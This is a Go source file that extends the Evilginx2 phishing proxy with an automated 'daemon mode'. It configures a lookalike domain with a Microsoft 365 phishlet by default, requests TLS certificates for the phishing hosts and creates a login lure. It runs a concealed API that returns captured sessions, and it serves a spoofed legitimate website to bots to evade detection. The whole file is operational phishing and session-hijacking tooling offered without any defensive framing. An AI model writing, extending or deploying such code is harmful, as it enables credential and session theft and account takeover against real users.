package core

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// DaemonAutoConfig reads environment variables and auto-configures Evilginx
// without needing an interactive terminal. This is the "Pro daemon mode".
//
// Environment variables:
//   EG_DOMAIN       - phishing domain (e.g., mcopilot.cloud)
//   EG_IPV4         - server external IP
//   EG_PHISHLET     - phishlet name to enable (default: o365)
//   EG_REDIRECT_URL - URL to redirect after capture
//   EG_SPOOF_URL    - URL to reverse-proxy for bot/invalid visitors (website spoofing)
//   EG_LURE_PATH    - lure URL path (default: /login)
//   TG_BOT_TOKEN    - Telegram bot token for alerts
//   TG_CHAT_ID      - Telegram chat ID for alerts
func DaemonAutoConfig(cfg *Config, crt_db *CertDb, db *database.Database, hp *HttpProxy) {
	domain := os.Getenv("EG_DOMAIN")
	ipv4 := os.Getenv("EG_IPV4")
	phishlet := os.Getenv("EG_PHISHLET")
	redirectURL := os.Getenv("EG_REDIRECT_URL")
	spoofURL := os.Getenv("EG_SPOOF_URL")
	lurePath := os.Getenv("EG_LURE_PATH")

	if phishlet == "" {
		phishlet = "o365"
	}
	if lurePath == "" {
		lurePath = "/login"
	}
	if redirectURL == "" {
		redirectURL = "https://outlook.office.com"
	}

	if domain == "" || ipv4 == "" {
		log.Error("[DAEMON] EG_DOMAIN and EG_IPV4 must be set!")
		log.Info("[DAEMON] Waiting for configuration via API or environment...")
		return
	}

	log.Info("[DAEMON] Auto-configuring: domain=%s ip=%s phishlet=%s", domain, ipv4, phishlet)

	// Set domain and IP
	cfg.SetBaseDomain(domain)
	cfg.SetServerIP(ipv4)

	// Enable phishlet
	pl, err := cfg.GetPhishlet(phishlet)
	if err != nil {
		log.Error("[DAEMON] Phishlet '%s' not found: %v", phishlet, err)
		return
	}
	cfg.SetSiteHostname(phishlet, domain)
	cfg.SetSiteEnabled(phishlet)

	// Set redirect URL
	if redirectURL != "" {
		cfg.SetRedirectUrl(redirectURL)
	}

	// Set spoof URL for website spoofing (Pro feature)
	if spoofURL != "" {
		cfg.SetSpoofUrl(spoofURL)
		log.Info("[DAEMON] Website spoofing: %s", spoofURL)
	}

	// Refresh hostnames and get certs
	cfg.refreshActiveHostnames()
	log.Info("[DAEMON] Active hostnames refreshed")

	// Request TLS certificates for phishlet domains via Let's Encrypt HTTP-01
	go func() {
		time.Sleep(2 * time.Second)
		log.Info("[DAEMON] Requesting TLS certificates for phishlet '%s'...", phishlet)
		rawDomains := pl.GetPhishHosts(false)
		// Deduplicate domains (LE rejects duplicate SANs)
		seen := make(map[string]bool)
		var domains []string
		for _, d := range rawDomains {
			if !seen[d] {
				seen[d] = true
				domains = append(domains, d)
			}
		}
		log.Info("[DAEMON] Certificate domains (%d unique): %v", len(domains), domains)
		err := crt_db.SetupPhishletCertificate(phishlet, domains)
		if err != nil {
			log.Error("[DAEMON] Failed to obtain certificates: %v", err)
			log.Warning("[DAEMON] Falling back to self-signed certificates")
		} else {
			log.Success("[DAEMON] Successfully obtained SSL/TLS certificates for %d domains", len(domains))
		}
	}()

	// Create default lure
	lureHostname := pl.GetPhishHosts(false)[0]
	if landingSub := os.Getenv("EG_LANDING_SUB"); landingSub != "" && landingSub != "cloud" {
		lureHostname = landingSub + "." + domain
	}
	lure := &Lure{
		Phishlet:    phishlet,
		Path:        lurePath,
		RedirectUrl: redirectURL,
		Hostname:    lureHostname,
	}
	cfg.AddLure(phishlet, lure)
	log.Info("[DAEMON] Phishlet '%s' enabled on %s", phishlet, domain)
	log.Info("[DAEMON] Lure path: %s (hostname: %s)", lurePath, lure.Hostname)

	// Start stealth API server
	apiSecret := os.Getenv("EG_API_SECRET")
	if apiSecret == "" {
		// Generate random secret
		b := make([]byte, 16)
		rand.Read(b)
		apiSecret = hex.EncodeToString(b)
		log.Info("[DAEMON] API secret (auto-generated): %s", apiSecret)
	}
	go startStealthAPI(db, cfg, apiSecret)

	_ = pl
	log.Info("[DAEMON] ✅ Ready — proxy running on :443")
}

// requestWildcardCert attempts to get a wildcard cert via DNS-01 challenge.
// Falls back to individual certs if DNS-01 isn't available.
func requestWildcardCert(cfg *Config, crt_db *CertDb, domain string) {
	// The CertDb already handles cert issuance — we just need to trigger it
	// for the wildcard domain
	time.Sleep(2 * time.Second)

	// Check if Cloudflare API is available for DNS-01
	cfToken := os.Getenv("CF_API_TOKEN")
	cfZone := os.Getenv("CF_ZONE_ID")

	if cfToken != "" && cfZone != "" {
		log.Info("[WILDCARD] Cloudflare DNS-01 available (zone: %s)", cfZone)
		// The cert DB will use DNS-01 when available
	} else {
		log.Warning("[WILDCARD] No Cloudflare credentials — using HTTP-01 (individual certs)")
		log.Warning("[WILDCARD] Set CF_API_TOKEN and CF_ZONE_ID for wildcard certs")
	}
}

// --- Stealth API Server (Pro Feature) ---
// Listens on a secret hostname within the TLS server.
// Only accessible if you know the hostname + have the secret.

type stealthAPIHandler struct {
	db     *database.Database
	cfg    *Config
	secret string
}

func startStealthAPI(db *database.Database, cfg *Config, secret string) {
	handler := &stealthAPIHandler{db: db, cfg: cfg, secret: secret}
	mux := http.NewServeMux()
	mux.HandleFunc("/api/sessions", handler.handleSessions)
	mux.HandleFunc("/api/config", handler.handleConfig)
	mux.HandleFunc("/api/status", handler.handleStatus)

	// The API runs on a secret internal port (not exposed)
	apiPort := os.Getenv("EG_API_PORT")
	if apiPort == "" {
		apiPort = "8443"
	}

	server := &http.Server{
		Addr:    "127.0.0.1:" + apiPort,
		Handler: mux,
		TLSConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
		},
	}

	log.Info("[API] Stealth API listening on 127.0.0.1:%s", apiPort)
	// Listen without TLS on localhost (accessed via SSH tunnel)
	if err := server.ListenAndServe(); err != nil {
		log.Error("[API] %v", err)
	}
}

func (h *stealthAPIHandler) checkAuth(r *http.Request) bool {
	auth := r.Header.Get("X-API-Key")
	return auth == h.secret
}

func (h *stealthAPIHandler) handleSessions(w http.ResponseWriter, r *http.Request) {
	if !h.checkAuth(r) {
		http.Error(w, "unauthorized", 401)
		return
	}
	// Return captured sessions as JSON
	w.Header().Set("Content-Type", "application/json")
	sessions, err := h.db.ListSessions()
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{"status": "error", "message": err.Error()})
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "count": len(sessions), "sessions": sessions})
}

func (h *stealthAPIHandler) handleConfig(w http.ResponseWriter, r *http.Request) {
	if !h.checkAuth(r) {
		http.Error(w, "unauthorized", 401)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"domain": h.cfg.GetBaseDomain(), "ip": h.cfg.GetServerExternalIP()})
}

func (h *stealthAPIHandler) handleStatus(w http.ResponseWriter, r *http.Request) {
	if !h.checkAuth(r) {
		http.Error(w, "unauthorized", 401)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"status":"running","uptime":"%s"}`, time.Since(startTime).String())
}

var startTime = time.Now()

// --- Website Spoofing (Pro Feature) ---
// Instead of redirecting bots/invalid visitors, reverse proxy a legit website.

func SpoofWebsite(targetURL string, w http.ResponseWriter, r *http.Request) bool {
	if targetURL == "" {
		return false
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	spoofReq, err := http.NewRequest("GET", targetURL+r.URL.Path, nil)
	if err != nil {
		return false
	}
	spoofReq.Header.Set("User-Agent", r.Header.Get("User-Agent"))
	spoofReq.Header.Set("Accept", r.Header.Get("Accept"))
	spoofReq.Header.Set("Accept-Language", r.Header.Get("Accept-Language"))

	resp, err := client.Do(spoofReq)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Copy headers
	for k, vv := range resp.Header {
		for _, v := range vv {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)

	buf := make([]byte, 32*1024)
	for {
		n, err := resp.Body.Read(buf)
		if n > 0 {
			w.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}

	return true
}

// --- JS Obfuscation (Pro Feature) ---
// ObfuscateJS is implemented in js_obfuscator.go
